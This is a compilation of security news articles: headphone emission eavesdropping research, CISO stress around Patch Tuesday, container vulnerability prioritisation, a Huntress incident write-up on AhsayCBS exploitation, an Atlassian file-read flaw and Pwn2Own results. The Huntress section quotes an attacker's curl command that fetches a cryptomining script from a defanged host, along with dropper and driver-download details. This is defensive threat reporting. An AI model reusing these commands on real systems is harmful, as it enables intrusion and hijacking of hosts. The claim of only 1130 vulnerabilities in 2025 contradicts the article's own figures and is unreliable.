This survey of 1300 cybersecurity leaders was commissioned by Chainguard and conducted online in September 2026 by Wakefield Research across several industries and in 10 markets (Brazil, France, Germany, Japan, Mexico, the UAE, the UK, the US, Saudi Arabia and Singapore), All respondents had a minimum seniority of director, and worked for companies with at least 500 employees (except in Singapore, UAE and Saudi Arabia, where the minimum was 250 employees).

Title: InjectEave: an attack that intercepts analog audio signals
Context: In a recent paper, researchers from two Hong Kong universities came up with InjectEave — an attack that exploits these properties to intercept the already-decoded analog audio...
Full Text:
When it comes to protecting voice calls, security professionals typically focus on the security of the data carrying the audio — above all on encryption. Sooner or later though, the voice data stops being a stream of bits and becomes an analog signal that goes straight to the speakers. You might think that if someone is using headphones, nobody can listen in. But headphones are electronic devices, and their components have physical characteristics that can give away closely guarded secrets without any cyberattack at all. In a recent paper, researchers from two Hong Kong universities came up with InjectEave — an attack that exploits these properties to intercept the already-decoded analog audio signal.

How the InjectEave attack works

The electronic components in headphones convert data into analog form and amplify the signal to drive the speakers. This process generates weak electromagnetic emissions. Capturing those emissions and extracting information from them is a field unto itself, with many experts working in it. The main issue those experts face lies in the fact that stray emissions from headphones are too faint to intercept and analyze in practice.

The authors of InjectEave propose adding a radio transmitter that beams a signal at a specific frequency toward the target device. Those weak emissions from the headphones’ analog components modulate the transmitter’s signal. The altered signal can be intercepted from several meters away — provided the receiving antenna is sensitive enough. The attacker then analyzes the changes in the signal to reconstruct the original audio.

Technical details of the InjectEave attack

The main obstacle to intercepting electromagnetic emissions directly — without an external transmitter — is the relatively low signal frequency. For example, the audio amplifier in headphones operates at frequencies from 20Hz to 20kHz. By contrast, electromagnetic emissions are easiest to intercept at frequencies measured in megahertz. The researchers were able to find a transmitter frequency that would also “amplify” the low-frequency signal of interest.

The researchers ran a series of experiments. They used antennas to transmit the “amplifying” signal and receive the result, and a spectrum analyzer to capture and process the data. The authors have posted the raw recordings of the intercepted signals on a dedicated microsite, so anyone can check how well the attack works. In most cases, getting a usable result didn’t even require complex processing or recognition. Conversations picked up from wireless headphones are clearly intelligible despite the elevated noise level.

In total, the authors tested three models of wireless headphones and two models of basic wired headsets. The effective eavesdropping distance varied from one to six meters depending on the model. With a wired telephone, they were able to demonstrate two-way interception. They could hear not only the sound from the speakers but also the potential victim’s speech, which the headset’s built-in microphone and analog-to-digital converter had captured.

Advantages and limitations of the method

Any attack that requires getting very close to the target is challenging by definition. The need to tune the frequency of the “amplifying” radio signal for each specific device makes the attack even harder. In their experiments, the researchers had to use frequencies from one to eight megahertz.

Despite these caveats, the main achievement of this attack is its being able to target the quirks of the analog components in an electronic device. These components inherently produce stray emissions, and there’s almost no way to reduce them.

Similar surveillance methods that intercept a digital signal can be stopped by adding a layer of encryption. When it comes to the analog side of a device, protecting the signal itself is much harder. This research is another reminder of how complex and unpredictable even very simple, familiar devices can be. Sometimes even the strongest protection for digital data is powerless once that information is converted to analog form.

Title: Fifth of CISOs Take Time Off to Avoid Patch Tuesday
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
One-in-five cybersecurity leaders has either called in sick or deliberately booked holiday time off to avoid Patch Tuesday, according to new data from Socura.

The MDR specialist polled 500 UK CSOs, CISOs and heads of IT security to better understand their attitudes to AI and the once-a-month date where Microsoft, Adobe and other vendors release their latest security updates.

While a plurality (41%) revealed that they have worked overtime to manage the patching cycle and over a third (37%) claimed they’ve worked late to deploy patches, a significant 22% said they have tried to swerve the date altogether.

Socura laid the blame on a growing number of patches and rising stress levels. Over a quarter (29%) of respondents said they feel “significant anxiety” the night before Patch Tuesday. The same share admitted they become more irritable with colleagues or family during that week.

Read more on CISO stress: CISOs Urged to Innovate with Talent Retention as Job Satisfaction Declines.

“You expect your accountant to be available for your tax return deadline, and your lawyer for your court date,” argued Socura CEO, Andrew Kays. “It speaks volumes about the unhealthy levels of stress and burnout in our industry that cybersecurity leaders would deliberately avoid the office during their most consequential day of work.”

The workload is rising as AI-powered vulnerability research helps vendors to discover software flaws in greater volumes. Microsoft fixed a record 974 CVEs in its September 2026 Patch Tuesday release, beating the previous record of 570 just two months prior.

By comparison, just 1130 vulnerabilities were published in the whole of 2025.

The data chimes with previous reports on CISO stress levels. In March 2026, a Seemplicity report revealed that 45% of cybersecurity leaders work 11+ extra hours per week – equivalent to an additional day – and 20% work an extra 16+ hours weekly.

A further two-fifths (43%) said they’re unable to take time off without creating a huge amount of stress upon their return.

“It's vital that security teams are properly resourced on Patch Tuesday, and that cybersecurity workers are properly supported emotionally, technically, and financially,” said Kays. “It's a tough job, and most people do it because they love it. That shouldn't be forgotten or exploited.”

AI Can Also Help

The good news for CISOs is that AI could also help to make certain aspects of the job less stressful.

Two-fifths (40%) of respondents told Socura that the technology automates mundane work, which in turn frees up teams to focus on more strategic tasks.

A similar share (37%) claimed that AI is helping them better protect their core corporate infrastructure against active threats.

Title: Exploitability Needs Runtime Evidence: Understanding Runtime Vulnerability Reachability for Containers
Context: A publicly available exploit may affect a package present across thousands of container images, while only a subset of those applications ever use the affected software
Full Text:
Key Takeaways

Qualys Runtime Vulnerability Reachability for Containers brings runtime evidence directly into vulnerability prioritization.

Package presence in a container image does not mean the vulnerable software is actually part of the workload’s live execution.

Runtime reachability answers whether the vulnerable software is relevant to a running workload, a different question from whether the vulnerability is theoretically exploitable.

Qualys retains runtime evidence over an observation window rather than a single point-in-time snapshot, so software that mattered yesterday is not missed today.

Runtime evidence works alongside CVSS, the CISA KEV catalog, EPSS, exposure analysis, and exploit validation to build a fuller picture of real-world risk.

The approach aligns with CISA’s direction under Binding Operational Directive (BOD) 26-04 toward prioritizing by likelihood and consequence of exploitation rather than static severity alone.

Finding vulnerabilities has never been easier. Determining which ones are actually exploitable in your environment is still hard.

The industry has built increasingly sophisticated ways to answer that question. The Common Vulnerability Scoring System (CVSS) measures severity. The Cybersecurity and Infrastructure Security Agency’s (CISA) Known Exploited Vulnerabilities Catalog (CISA KEV) tells us whether attackers are exploiting vulnerabilities in the wild. The Exploit Prediction Scoring System (EPSS) estimates the likelihood of exploitation. Exposure analysis tells us whether an attacker can reach the affected workload. Exploit validation can prove that a vulnerability can be successfully exploited under a particular set of conditions.

All of these signals matter. But they still leave an important question unanswered: is the vulnerable software actually part of the application running in production?

Qualys Runtime Vulnerability Reachability for Containers brings runtime evidence directly into vulnerability prioritization. By correlating vulnerabilities with software observed in the running workload and retaining that evidence over time, Qualys helps security teams distinguish between vulnerabilities that simply exist inside an image and those that are actually relevant to the workload’s execution.

From Theoretical Exploitability to Runtime Exploitability

A modern container image can contain hundreds of operating system packages, libraries, and transitive dependencies. Vulnerability scanning can accurately identify the Common Vulnerabilities and Exposures (CVEs) associated with those components, but package presence alone does not mean an attacker will ever encounter the vulnerable software.

This creates an important distinction between theoretical exploitability and runtime exploitability.

Exploit validation can demonstrate that a vulnerability is exploitable when the required conditions exist. That answers an important question: Can this vulnerability be exploited?

Runtime reachability answers another: Is the vulnerable software actually relevant to this workload?

For remediation prioritization, this context can be equally important or, in some cases, even more important.

A publicly available exploit may affect a package present across thousands of container images, while only a subset of those applications ever use the affected software. Conversely, vulnerable software repeatedly observed in an internet-facing production workload provides strong evidence that the affected component is part of the application’s live execution footprint.

Exploitability is therefore not simply a property of a CVE. It is a relationship between the vulnerability, the software, the workload, and the environment in which it runs.

Runtime provides evidence of that relationship.

Understanding Runtime Vulnerability Reachability

Qualys Runtime Vulnerability Reachability connects container vulnerability assessment with actual workload behavior. When vulnerable software is observed in the running workload, Qualys associates that runtime evidence with the corresponding vulnerabilities, helping teams understand which findings are relevant to the applications executing in production.

But the runtime cannot be treated as a single point-in-time snapshot.

Applications exercise different code paths at different times. A library may load at startup, during a scheduled process, or only when a particular Application Programming Interface (API) is invoked. If runtime validation looks exclusively at what is active at one instant, software that was important yesterday could appear irrelevant today.

That is why Qualys retains runtime reachability evidence across an observation window. Teams can understand whether vulnerable software has been observed in runtime over that window, rather than relying solely on what is loaded at the time of investigation.

This historical context turns runtime from a transient signal into durable evidence for vulnerability prioritization.

The example below shows this in practice. Filtering the dvwa-web-server container for CISA KEV vulnerabilities whose vulnerable packages have been observed in use over the last seven days (vulnerabilities.vulnerable.packages.inuse:[now-7d ... now]) narrows the results to four Critical Debian findings with available patches, including QID 178815 affecting apache2-bin.

Each of these four findings is tied to a package observed in the running workload within that window. A vulnerable package repeatedly observed in runtime over the last seven days should carry a different weight from software that has existed inside an image for months but has never been observed as part of the running workload.

How Qualys Thinks About Exploitability

Real-world exploitability emerges when multiple pieces of evidence converge.

CISA KEV can tell us that attackers are already exploiting a vulnerability. Exploit intelligence can indicate whether exploitation is practical or automated. Exposure analysis can determine whether an attacker has a path to the workload. Runtime reachability establishes whether the affected software is relevant to that workload. Attack path and business context can show what an attacker could reach after a compromise.

Combining these signals quickly narrows the focus. In the view below, the same container is filtered for internet exposure, CISA KEV status, and QID 178815. The result is a single running, publicly exposed workload, dvwa-webserver, with a TruRisk score of 305.

Consider two containers affected by the same Critical CISA KEV vulnerability, such as QID 178815. Both contain the same vulnerable package, and both may have a working public exploit. In one container, the affected software has never been observed in runtime. In the other, like the dvwa-web-server workload above, it has been observed in runtime within the last seven days in an externally exposed production workload.

The vulnerability is the same. Its theoretical exploitability is the same. The operational risk is not.

This is why runtime evidence can become one of the strongest signals for determining what security teams should remediate first. Exploit validation establishes the possibility. Runtime reachability establishes relevance. Exposure establishes opportunities. Threat intelligence establishes attacker activity.

Together, they provide a much stronger picture of exploitability than any one signal alone.

Aligning Vulnerability Prioritization to Real-World Risk

This approach aligns closely with the direction CISA is taking vulnerability management through BOD 26-04.

Rather than prioritizing vulnerabilities mainly by static severity, CISA considers factors such as:

Public exposure

Inclusion in the Known Exploited Vulnerabilities (KEV) Catalog

How easily an exploit can be automated

The technical impact of a successful compromise

The broader principle is important: remediation decisions should increasingly reflect the likelihood and consequence of exploitation, not simply the severity assigned to a CVE.

Runtime reachability adds environmental evidence to that model.

A vulnerability that is externally exposed, present in CISA KEV, and associated with software actively observed in runtime, represents a fundamentally different remediation priority from a high-severity vulnerability buried inside an unused package.

Security teams can be more effective in their risk remediation by moving beyond asking which vulnerabilities are critical and instead focusing on where the strongest evidence of exploitability is accumulating.

Exploitability Is a Continuum, Not a Checkbox

The next evolution of vulnerability management will not come from finding more vulnerabilities or producing another standalone risk score. It will come from increasing confidence behind every remediation decision.

With Runtime Vulnerability Reachability for Containers, Qualys is bringing runtime evidence directly into vulnerability management and preserving that evidence over time, helping organizations prioritize vulnerabilities based on how software behaves in production.

Because the most important question is no longer simply whether a vulnerability can be exploited.

It is whether the evidence of exploitation risk is converging in your environment.

Frequently Asked Questions (FAQs)

What is Runtime Vulnerability Reachability for Containers?

It correlates container vulnerabilities with software observed in the running workload and retains that evidence over an observation window, so teams can separate image presence from live relevance.

Is runtime reachability the same as exploit validation?

No. Exploit validation asks whether a vulnerability can be exploited when conditions exist. Runtime reachability asks whether the vulnerable software is relevant to this workload.

Why not use a single point-in-time snapshot?

Code paths load at different times. A library used yesterday can look idle at the moment of investigation. Qualys keeps evidence across the window.

How does this relate to CISA BOD 26-04?

BOD 26-04 pushes prioritization toward likelihood and consequence. Runtime evidence is one environmental input alongside KEV, exposure, and ease of automation.

Does “not observed in runtime” mean the CVE is safe to ignore?

No. It means the finding is lower priority than the same CVE observed in a live, exposed workload. Unused packages can still matter after a code-path change. Revisit them on the observation window, do not delete them from the backlog.

Full Text:
Acknowledgements: Special thanks to Dipo Rodipe, John Hammond, Susannah Matt, Ben Nahorney, and Lindsey Welch for their contributions to this investigation and writeup.

Update 10/12/26 @ 12pm ET

On October 12, Ahsay released a hotfix addressing CVE-2026-105133, the authentication bypass vulnerability, which prevents access to CVE-2026-105134 in AhsayCBS.

Companies running AhsayCBS v10 versions (including version 10.3.4.0) should apply the AhsayCBS 10.3.4.45 hotfix; and companies running AhsayCBS v7, v8, and v9 versions should apply the 9.15.2.70 hotfix (both are available via Ahsay's website).

Huntress has independently verified that the AhsayCBS 10.3.4.45 hotfix mitigates the initial entry point of this attack chain, which was still susceptible on previous v10 versions.

Update 10/8/26 @ 6pm ETAfter further investigation, Huntress has determined that Ahsay 10.3.4 is also affected by these vulnerabilities. Previous reporting indicated that 10.3.4 was not susceptible; we have updated this writeup to reflect our findings. We have also contacted Ahsay and shared the details of our research. Until a patch is available, we recommend restricting access to the management interface and investigating for signs of compromise.

Background

Huntress is observing threat actors targeting vulnerabilities in AhsayCBS (Cloud Backup Server), the management console for Ahsay's backup software (developed by Ahsay systems). AhsayCBS is primarily used by managed service providers (MSPs) and system integrators; it centralizes control of backup operations, letting administrators create and manage users, configure backup policies, and more.

On October 4, two vulnerabilities were identified in AhsayCBS:

CVE-2026-105133: A medium-severity flaw affecting the checkSysPwd function of the file com/ahsay/obs/api/ApiStructsAction.java, which can lead to improper authentication.

CVE-2026-105134: A critical-severity vulnerability affecting /rps/api/json/UpdateReceivers.do of the component Replication Receiver in AhsayCBS, which can be exploited to achieve unauthenticated remote code execution as NT AUTHORITY/SYSTEM on the host. The API contains an authentication bypass that could allow for a random token to substitute valid credentials. After exploitation, a threat actor configured a malicious receiver and dropped a Java Server Page (JSP) webshell into the application directory served by the CBS application.

Huntress is seeing these two vulnerabilities being chained together in order to gain access to targeted systems. First, CVE-2026-105133 is used to bypass authentication. Then CVE-2026-105134 is used to gain code execution.

Starting 2026-10-07 23:20:15 UTC, Huntress observed threat actors exploiting the vulnerabilities to gain unauthenticated remote code execution and deploy webshells on exposed systems. Initially, we picked up on several suspicious command lines spawning from AhsayCBS executable files (cbssvcX64.exe).

Figures 1 and 2: Suspicious child processes spawning from cbssvcX64.exe

Below, we're outlining the post-exploitation behavior observed and our analysis of the vulnerabilities in an effort to help defenders get ahead of this threat.

Post-exploitation activity

In some incidents we saw threat actors deploy .jsp webshells in the web application directory immediately after exploitation. Across several other incidents, we observed cbssvcX64.exe spawn a series of commands to drop several files in either the %TEMP% or ../AppData/Local/Temp folder from hxxp://imagefiles-backup.oss-ap-southeast-7.aliyuncs[.]com. These included Taskgmr.ps1, msedge.exe, edge.exe, and config.json.

Cryptominers

We also saw threat actors launch cryptomining operations via XMRig, a legitimate open-source Monero miner that attackers frequently install on compromised systems to covertly consume CPU resources and generate cryptocurrency for themselves.

On several endpoints we observed the XMRig miner (edge.exe), renamed to masquerade as a Microsoft Edge process, being dropped in Temp folders, followed by miner network connections being established on port 8029 to an XMR pool (51.195.127[.]124:8029, xmr.kryptex[.]network).

The actors executed PowerShell to modify config.json in the Temp folder, before creating a Windows service (MicrosoftEdgeUpdateSvc) that is designed to look similar to the actual Microsoft Edge Update service (edgeupdate). This service helped the attackers establish persistence on the endpoint, and was configured to run msedge.exe (one of the files downloaded earlier via the curl command from cbssvcX64.exe) from the Temp folder with SYSTEM privileges.

Figure 3: VirusTotal results for msedge.exe

Further investigation showed msedge.exe is a modified copy of the legitimate NSSM utility. NSSM can support other programs to ensure they stay running and restart after a crash or reboot, and threat actors in this incident likely used it to maintain persistence for edge.exe, while disguising the service-related binary as a legitimate-looking file.

PS1 Script/Task Manager

Taskgmr.ps1 appears to be an AI-assisted script (given the commented code) that supports cryptomining operations after being launched via curl:

curl -sk -o "C:\Users\ADMINI~1\AppData\Local\Temp\Taskgmr.ps1" "http://imagefiles-backup.oss-ap-southeast-7.aliyuncs[.]com/javas/Office/win/Taskgmr.ps1" --max-time 60

This script has several built-in anti-analysis functionalities. For instance, it checks continuously for the Task Manager. If Task Manager is opened it stops MicrosoftEdgeUpdateSvc to hide the cryptomining activity. When the Task Manager is closed, it restarts it again.

The script also kills Task Manager at a specific time (18:00) and if it was left open for more than one hour during overnight hours. The script used the endpoint's local Get-Date time as opposed to UTC.

Vulnerable Kernel Driver

In one of the incidents, Huntress observed threat actors using Windows' built-in certutil.exe to download a file to the TEMP folder (C:\Users\REDACTED\AppData\Local\Temp\WinRing0x64.sys) from hxxp://imagefiles-backup.oss-ap-southeast-7.aliyuncs[.]com.

WinRing0x64.sys is a known legitimate but vulnerable kernel driver that's part of the WinRing0 library (from OpenLibSys) and that provides low-level access to system hardware. Vulnerable drivers are often brought into attacks to disable endpoint security tools, but this case appeared to serve a different purpose.

By loading this driver, the attackers enabled the miner to operate with kernel-level access to the underlying hardware, supporting the cryptomining operation outlined above with the broadest possible control and performance. This capability has been previously publicly reported in other unrelated attacks.

Mitigation guidance for impacted organizations

AhsayCBS versions through 10.3.4 are impacted by these vulnerabilities.

Organizations should restrict AhsayCBS management interface web access, as the exploit targets the externally accessible web app service on the host. Access should be limited to trusted IP addresses only or require VPN. If any of the IoCs listed in this blog have been uncovered, companies should carry out a full host re-image from a trusted backup; as attackers have been able to hide secondary backdoors for extended persistence.

Huntress is currently working with potentially impacted organizations across our customer base to apply these mitigations; we recommend that all Ahsay customers adhere to these mitigations.

Sigma Rules

We've published four Sigma rules for this activity in the Huntress threat-intel repository (2026/2026-10/AhsayCBS_XMRig_Miner). They are post-exploitation detections written specifically for this campaign, and each targets a step the actor relies on to deploy, hide, or run the cryptominer, so alerting on any one of them gives defenders a chance to interrupt the chain. They follow the intrusion in the order described above.

Unexpected Child Process from AhsayCBS Service flags any process spawned by cbssvcX64.exe or cbssvcX86.exe outside the service's normal startup and maintenance commands. Because AhsayCBS runs its web app inside the service process, commands from an uploaded JSP webshell appear as direct children of the service.

Fake Edge Binary Launched with Daemonized Flag flags Edge-named binaries that carry the msedge_exe original file name or run with --daemonized. Here, a renamed NSSM and the XMRig miner posed as Microsoft Edge.

PowerShell Scriptblock - Task Manager Aware Service Control flags a script block that checks for Task Manager and stops or starts a service to match, which is how Taskgmr.ps1 hides the miner from users. It matches that pairing rather than the service name, so renaming the service won't evade it.

WinRing0 Driver Downloaded via Command Line flags a command line that names WinRing0 alongside a URL. Miner droppers fetch the vulnerable driver this way, while legitimate hardware-monitoring tools ship it inside their installers.

Title: Critical Flaw in Multiple Atlassian Products Exploited in the Wild
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
A critical vulnerability in Atlassian Data Center products is reportedly being exploited in the wild.

The flaw, tracked as CVE-2026-21589, was described by Atlassian in an October 5 advisory as an arbitrary file access, with a severity score (CVSS) of 9.3.

It affects eight Atlassian products, widely used in enterprise IT systems:

Bitbucket Data Center: a Git-based source-code management and collaboration for software development teams, used to host repositories, manage code changes and pull requests

Confluence Data Center: a team collaboration and knowledge-management platform, used for documentation, internal wikis, project information and shared knowledge

Jira Service Management Data Center: an IT service-management (ITSM) platform, used for service desks, incident management, service requests, changes and other IT workflows

Jira Software Data Center: a project and software-development management platform, used to plan, track and manage software work, including issues, sprints and releases

Bamboo Data Center: a continuous integration/continuous delivery (CI/CD) server used to automate software builds, tests and deployments

Crowd Data Center: a centralized identity and user-management platform for Atlassian and other applications, providing capabilities such as authentication and user-directory management

Crucible: a collaborative code-review tool, allowing developers to review and discuss changes to source code

Fisheye: a source-code repository browser and analysis tool, providing visibility into code repositories and development activity

The “data center” products are self-managed versions of Atlassian products, where the customer runs the software and manages the underlying infrastructure, rather than Atlassian hosting and operating it as software-as-service (SaaS). They typically are hosted in the company’s own data center or on infrastructure it controls in a public cloud such as AWS or Azure.

Exploiting CVE-2026-21589 allows an attacker with no login access to read specific files in each product's web application root directory.

Evidence of CVE-2026-21589 Exploitation Targeting Bamboo Data Center

In a vulnerability analysis published on October 6, WatchTowr found that the affected Atlassian products share a common Atlassian Web Resource framework, specifically the atlassian-plugins-webresource library. This shared library contains the vulnerable path-handling logic that allows an attacker to bypass path-traversal protections and read files from the application's webroot.

This explains why CVE-2026-21589 affects seemingly different products: they incorporate common Atlassian platform components, including this Web Resource library.

WatchTowr added that while Atlassian Crowd is also more than just one of the affected products, it plays an important role in the potential attack chain because it can be used as a central identity and authentication service for other Atlassian products. For example, when Jira is configured to use Crowd, Jira's crowd.properties configuration file contains the credentials that Jira uses to communicate with Crowd.

WatchTowr demonstrated that the arbitrary file-read vulnerability can be used to retrieve this file and expose those credentials.

This means the vulnerability can potentially go beyond simply reading files: an unauthenticated attacker could exploit CVE-2026-21589 to obtain Crowd credentials from an integrated Atlassian application and then use those credentials to interact with Crowd, potentially creating or modifying users and privileges.

In WatchTowr's demonstration, this provided a path towards obtaining Jira administrator-level access.

On October 7, VulnCheck added CVE-2026-21589 to its known exploited vulnerabilities (KEV) list, observing exploitation activity targeting Bamboo Data Center. VulnCheck’s dashboard links to Previdian as a source of exploitation intelligence.

The vulnerability has not been added to the US Cybersecurity and Infrastructure Securiy’s (CISA) own KEV catalog at the time of writing.

Atlassian’s Patch and Mitigation Recommendations

In its advisory, Atlassian provides the list of patched versions for each of the eight products affected by CVE-2026-21589:

Bitbucket Data Center (9.4.26, 10.2.8 and 10.5.1)

Confluence Data Center (9.2.26 and 10.2.19)

Jira Service Management Data Center (5.12.40, 10.3.26 and 11.3.12)

Jira Software Data Center (9.12.40, 10.3.26 and 11.3.12)

Bamboo Data Center (10.2.24 and 12.1.12)

Crowd Data Center (6.3.7, 7.0.3, 7.1.7 and 7.2.4)

Crucible (4.9.15)

Fisheye (4.9.15)

Customers are urged to patch each of their affected installations to fixed versions or the latest version.

If they cannot patch, Atlassian also recommended temporary mitigations that include:

Applying a web application firewall (WAF) rule (for all affected products)

Blocking requests using Tomcat’s RewriteValve (for Confluence, JSM, Jira, Bamboo and Crowd)

Adding a rule to urlrewrite.xml (for Bitbucket only)

Atlassian said it cannot confirm to users whether their instances have been affected by this vulnerability and recommended that customers engage with their local security team to check all affected instances for evidence of compromise.

WatchTowr has released a detection artefact generator for Jira, Confluence and Bitbucket that Atlassian customers can use to check whether an instance of any of these three product ranges is vulnerable.

Title: Pwn2Own Hackers Find 32 Zero-Day Vulnerabilities on Day One
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
Some of the world’s top ethical hackers descended on the Irish city of Cork in an event that began on October 6, where they have already discovered dozens of zero-day flaws in the latest Pwn2Own Ireland.

The hacking competition pits teams against each other in a contest to see who can unearth the most novel vulnerabilities.

On the first day of the Zero Day Initiative’s Pwn2Own Ireland 2026, teams targeted smartphones, smart home devices, printers, and AI tools like OpenAI Codex and LiteLLM.

Their total haul was 32 zero-day vulnerabilities and over $368,000 in prize money, as well as a trove of “Master of Pwn” points which will be totted up at the end of the competition.

Read more on Pwn2Own: Security Researchers Find 47 Zero-Days at Pwn2Own Berlin.

Day one saw several successes, including:

@_McCaulay combined an out-of-bounds write and a format string(!) bug to exploit the Sonos Era 300

Taisic Yun of Xint used an improper input validation bug and code injection to get a reverse shell on LiteLLM

Vũ Chí Thành and Huỳnh Đức Tin of VinSOC found seven zero days during their exploit of Philips Hue Bridge Pro

Thanh Do of Team Confused used a single use-after-free exploit on the Lexmark CX532adwe

Nam Nguyen, Thanh Vu, and Tin Huynh of VinSOC combined five zero days to exploit the Oracle Autonomous AI Database

Ikotas Labs, Inc. used a single argument injection bug to exploit OpenAI Codex

Interrupt Labs used an OOB read and an OOB write to exploit the Garmin Index BPM

Ethical Hacking to the Fore

Hacking competitions like this are arguably more important than ever as vendors struggle to find vulnerabilities in their products before their adversaries do.

As a part of the Zero Day Initiative (ZDI), Pwn2Own findings are responsibly disclosed to the relevant vendors, who then have 90 days to release updates before the ZDI publishes them.

AI-enabled tools are increasingly being used in an offensive capacity to research exploits, either for novel bugs or recently published flaws.

According to Google, vulnerability disclosures doubled from 5045 in January 2026 to 10,477 in July, reaching 10,740 in August 2026. Exploited vulnerabilities rose from an average of 10.5 a month in 2025 to 18 a month so far in 2026.

AI discovery also skews to higher impact flaws: 50% of vulnerabilities Google identified as likely AI-discovered resulted in remote code execution, against 26% of other CVEs.

However, separate research claims that just 1% of AI-discovered vulnerabilities have been exploited in the wild.

Pwn2Own continues on October 7 and 8, when the Master of Pwn will be announced.
